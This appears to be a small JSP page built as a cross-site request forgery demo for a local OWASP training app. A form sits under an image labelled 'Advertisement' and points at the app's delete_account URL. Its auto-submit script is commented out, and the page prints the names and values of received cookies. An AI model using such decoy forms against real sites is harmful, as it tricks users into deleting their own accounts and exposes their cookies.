<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>


<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Attack</title>
</head>
<body>
<img src="https://www.canva.com/learn/wp-content/uploads/2015/06/19_customtype-tb-800x0.jpg" alt="Advertisement">
<form action="http://localhost:8080/OWASP/delete_account" method="get" id="id1">
<%Cookie cookie = null;
Cookie[] cookies = null;
cookies = request.getCookies();

if( cookies != null ) {
   out.println("<h2> Found Cookies Name and Value</h2>");
   
   for (int i = 0; i < cookies.length; i++) {
      cookie = cookies[i];
      out.print("Name : " + cookie.getName( ) + ",  ");
      out.print("Value: " + cookie.getValue( )+" <br/>");
   }
} else {
   out.println("<h2>No cookies founds</h2>");
} %>
 <input type="submit">
</form>
<script>
//document.getElementById("id1").submit();
</script>
</body>
</html>